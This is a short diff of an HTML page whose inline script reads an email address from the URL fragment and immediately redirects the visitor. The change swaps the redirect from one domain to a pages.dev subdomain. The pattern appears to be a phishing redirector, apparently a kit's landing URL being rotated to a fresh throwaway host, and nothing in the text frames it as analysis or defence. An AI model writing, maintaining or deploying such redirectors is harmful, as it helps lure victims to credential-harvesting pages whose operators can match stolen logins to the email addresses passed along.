@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://madrianlimited.com/apeyye/";
+			window.location.href = "https://acc57geuj.pages.dev/";
 		}, 0);
 	</script>
 </html>
